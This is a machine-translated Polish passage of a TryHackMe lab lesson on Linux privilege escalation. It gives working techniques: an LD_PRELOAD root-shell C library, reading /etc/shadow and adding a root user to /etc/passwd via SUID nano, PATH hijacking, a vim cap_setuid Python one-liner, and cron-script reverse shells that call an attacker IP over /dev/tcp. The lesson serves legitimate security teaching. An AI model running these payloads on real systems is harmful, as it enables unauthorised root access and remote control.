---

## Wstęp

W [LinuxEskalacja uprawnień:](https://tryhackme.com/room/linprivenum) Sala enumeracyjna, zbudowałeś podstawy enumeracji — nauczyłeś się, jak przeprowadzać ankietęLinuxsystem pod kątem błędnych konfiguracji, słabych uprawnień i potencjalnych wektorów eskalacji. Czas podjąć działania w oparciu o to, co odkryłeś.

Ten pokój zaczyna się tam, gdzie[LinuxEskalacja uprawnień:](https://tryhackme.com/room/linprivenum) sala enumeracyjna. Zajmiesz się tymi samymi błędami konfiguracji, których nauczyłeś się rozpoznawać, i wykorzystasz je, aby przejść z użytkownika o niskich uprawnieniach na użytkownika root. Każda sekcja koncentruje się na innym wektorze: nadużywaniu uprawnień sudo, wykorzystywaniu plików binarnych SUID, przejęciu zmiennej PATH, wykorzystywaniu zapisywalnych zadań cron, wykorzystywaniu…Linuxmożliwości i nieprawidłowo skonfigurowane udziały NFS.

**Uwaga:** Każde zadanie będzie miało swoją własną maszynę docelową. Upewnij się, że zawsze uruchamiasz nową maszynę docelową pasującą do zadania.

## Wymagania wstępne

- [Linux](https://tryhackme.com/module/linux-fundamentals)Moduł [podstawowy](https://tryhackme.com/module/linux-fundamentals)
- [LinuxEskalacja uprawnień:](https://tryhackme.com/room/linprivenum) Pokój wyliczeń

## Cele edukacyjne

- Zrozumieć podstawy Linuxwektory eskalacji uprawnień
- Zrozum wpływ Linux eskalacja uprawnień
- Wykazanie ręcznej eksploatacji Linuxeskalacja uprawnień

Referencje

Potrzebne tylko wtedy, gdy używasz własnegoTHM VPN-połączona maszyna.

Nazwa użytkownika

Jan

Hasło

Jan

Połączenie przez

SSH

sshjohn@10.129.168.238

Polecenie sudo domyślnie pozwala na uruchomienie programu z uprawnieniami roota. W pewnych okolicznościach administratorzy systemu mogą potrzebować dać zwykłym użytkownikom pewną elastyczność w zakresie uprawnień. Na przykład, młodszy użytkownik SOC analityk może potrzebować użyć Nmap Regularnie, ale nie będzie można go wyczyścić, aby uzyskać pełny dostęp do konta root. W takiej sytuacji administrator systemu może zezwolić temu użytkownikowi na uruchamianie tylko Nma z uprawnieniami roota, zachowując jednocześnie swój standardowy poziom uprawnieńodpoczyneksystemu. To zadanie skupi się na trzech różnych technikach nadużywania sudo.

[https://gtfobins.github.io/(otwiera się w nowej karcie)](https://gtfobins.github.io/)jest cennym źródłem informacji o tym, jak program, do którego masz uprawnienia sudo, może być przedmiotem nadużyć.

## Podstawowa eskalacja Sudo

Każdy użytkownik może sprawdzić swoją aktualną sytuację związaną z uprawnieniami roota za pomocą `sudo -l`polecenia. Wynik wygląda podobnie do poniższego przykładu.

sudo -l

```shell-session
john@sudo-box:~$ sudo -lMatching Defaults entries for labuser on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User labuser may run the following commands on target:    (ALL) NOPASSWD: /bin/cat
```

W tym przypadku użytkownik może działać `/bin/cat`jako root, co oznacza, że ​​może odczytać dowolny plik z uprawnieniami roota. Na przykład odczyt `/etc/shadow`pokaże skróty haseł innych użytkowników, które można złamać offline.

## Wykorzystaj funkcje aplikacji

Niektóre aplikacje nie będą miały znanego exploita w tym kontekście. Taką aplikacją może być serwer Apache2.

W takim przypadku można użyć „hacku”, aby wykraść informacje, wykorzystując funkcję aplikacji. Jak widać poniżej, Apache2 ma opcję, która obsługuje ładowanie alternatywnych plików konfiguracyjnych ( `-f`: określ alternatywny plik ServerConfigFile).

apache2 -h

```shell-session
john@sudo-box:~$ apache2 -hUsage: apache2 [-D name] [-d directory] [-f file]
               [-C "directive"] [-c "directive"]
               [-k start|restart|graceful|graceful-stop|stop]
               [-v] [-V] [-h] [-l] [-L] [-t] [-S] [-X]Options:  -D name           : define a name for use in <IfDefine name> directives  -d directory      : specify an alternate initial ServerRoot  -f file           : specify an alternate ServerConfigFile  -C "directive"    : process directive before reading config files  -c "directive"    : process directive after reading config files  -e level          : show startup errors of level (see LogLevel)  -E file           : log startup errors to file  -v                : show version number  -V                : show compile settings  -h                : list available command line options (this page)  -l                : list compiled in modules
```

Załadowanie `/etc/shadow`pliku z użyciem tej opcji spowoduje wyświetlenie komunikatu o błędzie zawierającego pierwszy wiersz pliku `/etc/shadow`, ale ponieważ jest to wiersz główny, w zasadzie otrzymasz skrót główny, który można złamać offline. W systemie Ubuntu polecenie wygląda następująco:

`sudo apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow`

## **Wykorzystaj LD_PRELOAD**

W niektórych systemach może być widoczna opcja środowiskowa LD_PRELOAD.

sudo -l -> LD_PRELOAD

```shell-session
john@sudo-box:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOADUser john may run the following commands on this host:    (root) NOPASSWD: /usr/sbin/iftop    (root) NOPASSWD: /usr/bin/find    (root) NOPASSWD: /usr/bin/nano    (root) NOPASSWD: /usr/bin/vim
```

LD_PRELOAD to funkcja, która pozwala każdemu programowi korzystać z bibliotek współdzielonych. Ten [wpis na blogu(otwiera się w nowej karcie)](https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0)da Ci pojęcie o możliwościach LD_PRELOAD. Jeśli opcja „env_keep” jest włączona, możesz wygenerować bibliotekę współdzieloną, która zostanie załadowana i wykonana przed uruchomieniem programu. Pamiętaj, że opcja LD_PRELOAD zostanie zignorowana, jeśli rzeczywisty identyfikator użytkownika różni się od efektywnego.

Kroki tego wektora eskalacji uprawnień można podsumować następująco:

1. Sprawdź LD_PRELOAD (z opcją env_keep)
2. Napisz prosty kod C skompilowany jako plik obiektu współdzielonego (rozszerzenie .so)
3. Uruchom program z uprawnieniami sudo i opcją LD_PRELOAD wskazującą na nasz plik .so

Kod C po prostu uruchomi powłokę główną i można go zapisać w następujący sposób:

Przykład kodu C

```shell-session
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h> 
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0); system("/bin/bash");
} 
```

Możesz zapisać ten kod jako shell.c i skompilować go `gcc`do pliku obiektu współdzielonego, używając następujących parametrów:

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

```shell-session
john@sudo-box:~$ cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {unsetenv("LD_PRELOAD");setgid(0);setuid(0);system("/bin/bash");}john@sudo-box:~$ lsshell.cjohn@sudo-box:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfilesjohn@sudo-box:~$ lsshell.c  shell.so
```

Możesz teraz używać tego pliku obiektu współdzielonego podczas uruchamiania dowolnego programu, który użytkownik może uruchomić za pomocą sudo. W tym przypadku można użyć , `apache2`, `find`lub prawie każdego programu, który można uruchomić za pomocą sudo.

Aby uruchomić program, należy określić opcję LD_PRELOAD w następujący sposób:

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

Spowoduje to pojawienie się powłoki z uprawnieniami roota.

skorupa korzenia

```shell-session
john@sudo-box:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
john@sudo-box:~$ whoami
user
john@sudo-box:~$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
root@sudo-box:/home/john# id
uid=0(root) gid=0(root) groups=0(root)
root@sudo-box:/home/john# whoami
root
```

Sytuacja LD_PRELOAD jest rzadka. Najczęściej można znaleźć prostsze wektory eskalacji uprawnień sudo. Użytkownikowi komputera docelowego przypisano uprawnienia sudo, które pozwalają mu na eskalację uprawnień za pomocą jednej z przedstawionych technik.

Wiele z Linux Kontrola uprawnień polega na kontrolowaniu interakcji między użytkownikami a plikami. Odbywa się to za pomocą uprawnień. Wiesz już, że pliki mogą mieć uprawnienia do odczytu, zapisu i wykonywania. Są one przyznawane użytkownikom w ramach ich poziomów uprawnień. Zmienia się to za pomocą SUID (Set-user Identification) i SGID (Set-group Identification). Umożliwiają one wykonywanie plików z poziomem uprawnień odpowiednio właściciela pliku lub właściciela grupy.

Zauważysz, że te pliki mają `s`ustawiony bit pokazujący ich specjalny poziom uprawnień. Oznacza to, że program będzie działał z efektywnym identyfikatorem użytkownika właściciela pliku binarnego.

`find / -type f -perm -04000 -ls 2>/dev/null`wyświetli listę plików, które mają ustawione bity SUID lub SGID.

znajdź / -type f -perm -04000 -ls 2>/dev/null

```shell-session
john@suid-box:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Feb 15  2011 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517   12 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473326  188 -rwsr-xr-x   1 root     root       188328 Apr 15  2010 /bin/nano  (Note: this normally doesn't have SUID)
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
```

Dobrą praktyką byłoby porównanie plików wykonywalnych na tej liście z GTFOBins ( [https://gtfobins.github.io(otwiera się w nowej karcie)](https://gtfobins.github.io/)Kliknięcie przycisku SUID spowoduje odfiltrowanie plików binarnych, które mogą być podatne na atak, gdy ustawiony jest bit SUID (listę wstępnie przefiltrowanych plików można znaleźć również pod tym linkiem: [https://gtfobins.org/#//^suid$(otwiera się w nowej karcie)](https://gtfobins.org/#//^suid$)Powyższa lista pokazuje, że nano ma ustawiony bit SUID. Typowe dla rzeczywistych scenariuszy eskalacji uprawnień, konieczne będzie znalezienie kroków pośrednich, które pomogą wykorzystać wszelkie drobne odkrycia, jakie posiadamy.

![Pliki binarne GTFObins SUID](https://assets.tryhackme.com/additional/imgur/rSRTn5v.png)

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Dołączona maszyna wirtualna ma inny plik binarny z identyfikatorem SUID innym niż `nano`. Należy go znaleźć, korzystając z technik przedstawionych w tym zadaniu.

Bit SUID ustawiony dla edytora tekstowego Nano umożliwia tworzenie, edycję i odczyt plików z uprawnieniami właściciela pliku. Nano należy do użytkownika root, co oznacza, że ​​możesz odczytywać i edytować pliki z wyższym poziomem uprawnień niż posiada Twój obecny użytkownik. Na tym etapie masz dwie podstawowe opcje eskalacji uprawnień: odczyt pliku `/etc/shadow`lub dodanie użytkownika do `/etc/passwd`.

## Odczyt pliku /etc/shadow

Można zobaczyć, że edytor tekstu nano ma ustawiony bit SUID, uruchamiając to `find / -type f -perm -04000 -ls 2>/dev/null`polecenie.

`nano /etc/shadow`wydrukuje zawartość pliku `/etc/shadow`. Możesz teraz użyć narzędzia unshadow, aby utworzyć plik możliwy do złamania przez Johna Rozpruwacza. Aby to osiągnąć, unshadow potrzebuje zarówno plików , `/etc/shadow`jak i `/etc/passwd`.

![Lista pokazująca zarówno pliki passwd, jak i pliki shadow](https://assets.tryhackme.com/additional/imgur/DAWxbJD.png)

Poniżej można zobaczyć zastosowanie narzędzia Unshadow:  
`unshadow passwd.txt shadow.txt > passwords.txt`

unshadow passwd.txt shadow.txt > hasła.txt

```shell-session
john@suid-box:~$ unshadow passwd.txt shadow.txt > passwords.txt
Created directory /home/user/.john
```

Z poprawną listą słów i odrobiną szczęścia, Jan Rozpruwacz może zwrócić jedno lub kilka haseł w postaci zwykłego tekstu. Aby zapoznać się ze szczegółowym opisem Jana Rozpruwacza, odwiedź nasz pokój „ [Jan Rozpruwacz: Podstawy](https://tryhackme.com/room/johntheripperbasics) ”.

## Zastępowanie użytkownika root

Inną opcją byłoby dodanie nowego użytkownika z uprawnieniami roota. Pomogłoby to ominąć żmudny proces łamania haseł. Poniżej znajdziesz prosty sposób, aby to zrobić.

Będziesz potrzebować wartości skrótu hasła, które ma otrzymać nowy użytkownik. Można to szybko zrobić za pomocą narzędzia OpenSSL w systemie Kali Linux.

openssl passwd -1 -salt THM hasło1

```shell-session
john@suid-box:~$ openssl passwd -1 -salt THM password1
$1$THM$WnbwlliCqxFRQepUTCkUT1
```

Następnie dodasz to hasło i nazwę użytkownika do `/etc/passwd`pliku.

/etc/passwd

```shell-session
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/false
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
statd:x:103:65534::/var/lib/nfs:/bin/false
user2:$1$J/n4dHHj$QXqkhtfrlz1VYMjXbyK820:0:0:root:/root:/bin/bash
hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
```

Po dodaniu użytkownika (pamiętaj, w jaki sposób `root:/bin/bash`utworzono powłokę roota) musisz przełączyć się na tego użytkownika i mieć uprawnienia roota.

Eskalacja do roota

```shell-session
john@suid-box:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
john@suid-box:~$ whoami
john
john@suid-box:~$ su hacker
Password:
root@suid-box:~# id
uid=0(root) gid=0(root) groups=0(root)
root@suid-box:~# whoami
root
```

Następnie będziesz musiał wykorzystać podobną lukę w zabezpieczeniach systemu docelowego.

Jeśli katalog, do którego użytkownik ma uprawnienia do zapisu, znajduje się w `PATH`, możesz potencjalnie przejąć kontrolę nad aplikacją w celu uruchomienia skryptu.  `PATH`W systemie Linux jest to zmienna środowiskowa, która wskazuje systemowi operacyjnemu, gdzie szukać plików wykonywalnych. Dla każdego polecenia, które nie jest wbudowane w powłokę lub nie jest zdefiniowane ze ścieżką bezwzględną, system Linux rozpocznie wyszukiwanie w katalogach zdefiniowanych w `$PATH`. ( `PATH`to zmienna środowiskowa, o której tu mówimy, a ścieżka to lokalizacja katalogu).

Zazwyczaj `PATH`będzie wyglądać to tak:

echo $PATH

```shell-session
john@path-box:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Jeśli wpiszesz „thm” w wierszu poleceń, Linux będzie szukał w tych lokalizacjach pliku wykonywalnego o nazwie thm. Poniższy scenariusz pozwoli Ci lepiej zrozumieć, jak można to wykorzystać do zwiększenia poziomu uprawnień. Jak zobaczysz, zależy to całkowicie od istniejącej konfiguracji systemu docelowego, więc upewnij się, że potrafisz odpowiedzieć na poniższe pytania, zanim spróbujesz.

1. W jakich katalogach się znajdują `$PATH`?
2. Czy Twój obecny użytkownik ma uprawnienia do zapisu w którymś z tych katalogów?
3. Czy możesz zmodyfikować `$PATH`?
4. Czy istnieje skrypt/aplikacja, którą możesz uruchomić i która będzie narażona na tę lukę?

W celach demonstracyjnych zapoznaj się z poniższym programem:

Ten skrypt próbuje uruchomić plik binarny systemu o nazwie „thm”, ale przykład można łatwo powtórzyć z dowolnym plikiem binarnym. Poniżej kod jest kompilowany do pliku wykonywalnego i otrzymuje uprawnienia SUID.

cat path_exp.c

```shell-session
root@path-box:~# cat path_exp.c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("thm");
}
root@path-box:~# gcc path_exp.c -o program -w
root@path-box:~# chmod u+s program
root@path-box:~# ls -l
total 24
-rwsr-xr-x 1 root  root  16792 Jun 17 07:02 program
-rw-rw-r-- 1 alper alper    76 Jun 17 06:53 path_exp.c
```

Po uruchomieniu „program” będzie szukał pliku wykonywalnego o nazwie „thm” w katalogach wymienionych w `PATH`. Jeśli w znajduje się jakikolwiek katalog zapisywalny `PATH`, możesz utworzyć plik binarny o nazwie  **thm** w tym katalogu i uruchomić go za pomocą swojego programu. Ponieważ bit SUID jest ustawiony, ten plik binarny zostanie uruchomiony z uprawnieniami roota. Proste wyszukiwanie katalogów zapisywalnych można przeprowadzić za pomocą polecenia `find / -writable 2>/dev/null`. Dane wyjściowe tego polecenia można oczyścić za pomocą prostej sekwencji cięcia i sortowania.

znajdź / -wpisz d -zapisywalny 2> /dev/null | sortuj -u

```shell-session
john@path-box:~$ find / -type d -writable 2> /dev/null | sort -u/run/user/1001/systemd/inaccessible/run/user/1001/systemd/propagate/run/user/1001/systemd/propagate/.os-release-stage/run/user/1001/systemd/units/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/tmp/tmp/.ICE-unix/tmp/.X11-unix/tmp/.XIM-unix/tmp/.font-unix
```

Katalog, do którego będzie łatwiej zapisywać, to prawdopodobnie `/tmp`. W tym momencie, ponieważ `/tmp`nie ma go w `PATH`, musisz go dodać.

Jak widać poniżej,  `export PATH=/tmp:$PATH`polecenie to realizuje ten cel.

eksportuj $PATH=/tmp:$PATH

```shell-session
john@path-box:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
john@path-box:~$ export PATH=/tmp:$PATH
john@path-box:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

W tym momencie `program`plik binarny będzie również szukał w `/tmp`katalogu pliku wykonywalnego o nazwie „thm”.

Teraz, gdy plik `program`binarny będzie szukałthmplik wykonywalny w `/tmp`, naszym następnym krokiem będzie utworzenie pliku `thm`binarnego lub skryptu w tym katalogu, który zwiększy nasze uprawnienia.

tworzyćthmscenariusz

```shell-session
john@path-box:~$ cd /tmp
john@path-box:~$ echo "/bin/bash" > thm
john@path-box:~$ chmod 777 thm
john@path-box:~$ ls -l thm
-rwxrwxrwx 1 john john 10 Jun 17 14:36 thm
```

Będziesz musiał udzielić uprawnień do wykonania swojej kopii `/bin/bash`. W tym kontekście eskalacja uprawnień jest możliwa, ponieważ `program`plik binarny działa z uprawnieniami roota.

Eskaluj do roota

```shell-session
john@path-box:~$ whoami
john
john@path-box:~$ ./program
root@path-box:~# whoami
root
```

Następnie będziesz musiał wykorzystać podobny scenariusz.

Inną metodą, z której administratorzy systemów mogą skorzystać, aby podnieść poziom uprawnień procesu lub pliku binarnego, są „możliwości”. Możliwości pomagają zarządzać uprawnieniami na bardziej szczegółowym poziomie. Na przykład, jeśliSOCAnalityk musi użyć narzędzia, które inicjuje połączenia z gniazdem, a zwykły użytkownik nie byłby w stanie tego zrobić. Jeśli administrator systemu nie chce nadać temu użytkownikowi wyższych uprawnień, może zmienić uprawnienia pliku binarnego. W rezultacie plik binarny wykona swoje zadanie bez konieczności korzystania z użytkownika o wyższych uprawnieniach. Strona
z uprawnieniami manzawiera szczegółowe informacje na temat jego użycia i dostępnych opcji.

Za pomocą tego narzędzia możesz getcap wyświetlić listę włączonych funkcji.

getcap -r / 2>/dev/null
john@capabilities-box:~$ getcap -r / 2>/dev/null
/home/john/vim = cap_setuid+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
Możliwość ta cap_setuid+eppozwala plikowi binarnemu na zmianę identyfikatora użytkownika na dowolnego użytkownika (w tym użytkownika root), a możliwość ta staje się natychmiast aktywna po uruchomieniu.

W przypadku uruchomienia jako użytkownik bez uprawnień,  getcap -r /wygenerowana zostanie ogromna liczba błędów, dlatego dobrą praktyką jest przekierowywanie komunikatów o błędach do /dev/null.

Należy pamiętać, że ani Vim, ani jego kopia nie mają ustawionego bitu SUID. Ten wektor eskalacji uprawnień nie jest zatem wykrywalny podczas enumeracji plików w poszukiwaniu SUID.

ls -l /home/jan/vim
john@capabilities-box:~$ ls -l /usr/bin/vim
lrwxrwxrwx 1 root root 21 Jun 16 00:43 /usr/bin/vim → /etc/alternatives/vim
john@capabilities-box:~$ ls -l /home/john/vim
-rwxr-xr-x 1 root root 2906824 Jun 16 02:06 /home/john/vim
GTFObins(otwiera się w nowej karcie)ma dobrą listę plików binarnych, które można wykorzystać do eskalacji uprawnień, jeśli znajdziesz jakieś ustalone możliwości.

Należy pamiętać, że Vim może być używany z następującym poleceniem i ładunkiem:

Eksploatacja Pythona
john@capabilities-box:~$ whoami
john
john@capabilities-box:~$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
Powyższe polecenie używa Vima do uruchomienia kodu Pythona. Najpierw osimportowana jest biblioteka. Następnie setuidpolecenie ustawia identyfikator użytkownika na 0 (root); bez tego polecenie zostałoby uruchomione z oryginalnym identyfikatorem użytkownika. Na koniec polecenie /bin/bashjest wywoływane z uprawnieniami roota.

Eskalacja do roota
root@capabilities-box:~# id
uid=0(root) gid=1000(john) groups=1000(john),4(adm),4(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
Następnie będziesz musiał wykorzystać podobną lukę w zabezpieczeniach systemu docelowego.

Zadania cron służą do uruchamiania skryptów lub plików binarnych w określonych momentach. Domyślnie działają one z uprawnieniami ich właścicieli, a nie bieżącego użytkownika. Chociaż poprawnie skonfigurowane zadania cron nie są z natury podatne na ataki, w pewnych okolicznościach mogą stanowić wektor eskalacji uprawnień.  
Jeśli istnieje zaplanowane zadanie uruchamiane z uprawnieniami użytkownika root i można zmienić skrypt, który ma zostać uruchomiony, skrypt zostanie uruchomiony z uprawnieniami użytkownika root.

Konfiguracje zadań cron są przechowywane w postaci tabel cron (plików cron), aby można było sprawdzić datę i godzinę następnego uruchomienia zadania.

Każdy użytkownik systemu ma swój plik crontab i może uruchamiać określone zadania, niezależnie od tego, czy jest zalogowany, czy nie. Jak można się spodziewać, celem będzie znalezienie zadania cron ustawionego przez użytkownika root i uruchomienie przez nie naszego skryptu, najlepiej powłoki.

Każdy użytkownik może odczytać plik przechowujący zadania cron dla całego systemu /etc/crontab. 

Podczas gdy na maszynach CTF zadania cron mogą być uruchamiane co minutę lub co 5 minut, w przypadku testów penetracyjnych częściej można zobaczyć zadania uruchamiane codziennie, co tydzień lub co miesiąc.

Informacja: Wpisy na komputerze docelowym będą się różnić od wpisów użytych w tych przykładach.

kot /etc/crontab
john@cron-box:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /home/john/Desktop/backup.sh
Jak widać, backup.shskrypt został skonfigurowany do uruchamiania co minutę. Zawartość pliku pokazuje prosty skrypt, który tworzy kopię zapasową pliku prices.xls.

kopia zapasowa kota.sh
john@cron-box:~$ ls -la backup.sh
-rwxrwxrwx 1 root root 142 Apr 28 14:23 backup.sh
Ponieważ obecny użytkownik ma dostęp do tego skryptu, możesz go zmodyfikować, aby utworzyć powłokę odwrotną z uprawnieniami roota.

Skrypt użyje narzędzi dostępnych w systemie docelowym do uruchomienia powłoki odwrotnej.
Dwie uwagi:

Składnia polecenia będzie się różnić w zależności od dostępnych narzędzi. (np. ncprawdopodobnie nie będzie obsługiwała -eopcji, którą mogłeś widzieć w innych przypadkach)
Zawsze powinieneś preferować uruchamianie powłok odwrotnych, ponieważ nie chcesz narażać integralności systemu podczas rzeczywistych testów penetracyjnych.
Plik powinien wyglądać następująco:

Zastąp backup.sh
john@cron-box:~$ cat backup.sh
#!/bin/bash
bash -i >& /dev/tcp/10.130.126.128/6666 0>&1
Następnie uruchamiasz na maszynie atakującej program nasłuchujący, aby odebrać połączenie przychodzące.

Rozpocznij nasłuchiwanie
root@10.130.126.128:~# nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.130.126.128] from (UNKNOWN) [10.130.135.215] 43550
bash: cannot set terminal process group (4483): Inappropriate ioctl for device
bash: no job control in this shell
root@targetsystem:~# id
id
uid=0(root) gid=0(root) groups=0(root)
Zawsze warto sprawdzić Crontab, ponieważ może on czasami prowadzić do eskalacji uprawnień. Poniższy scenariusz nie jest rzadkością w firmach, które nie mają określonego poziomu dojrzałości cyberbezpieczeństwa.

Administratorzy systemu muszą regularnie uruchamiać skrypt. W tym celu tworzą zadanie cron. Po pewnym czasie skrypt staje się bezużyteczny, więc go usuwają, zapominając o wyczyszczeniu odpowiedniego zadania cron.

kot /etc/crontab
john@cron-box:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root antivirus.sh
john@cron-box:~$ locate antivirus.sh
john@cron-box:~$
Powyższy przykład pokazuje podobną sytuację, w której antivirus.shskrypt został usunięty, ale zadanie cron nadal istnieje. Jeśli pełna ścieżka skryptu nie jest zdefiniowana (jak w przypadku skryptu backup.sh), cron będzie odwoływał się do ścieżek wymienionych pod PATHzmienną w pliku /etc/crontab. W takim przypadku powinieneś móc utworzyć skrypt o nazwie znajdującej antivirus.shsię w zapisywalnym katalogu wymienionym w PATHzmiennej i powinien on zostać uruchomiony przez zadanie cron. Plik w systemie docelowym powinien wyglądać podobnie do poprzedniego.

Utwórz plik antivirus.sh
john@cron-box:~$ cat antivirus.sh
#!/bin/bash
bash -i >& /dev/tcp/10.130.126.128/7777 0>&1
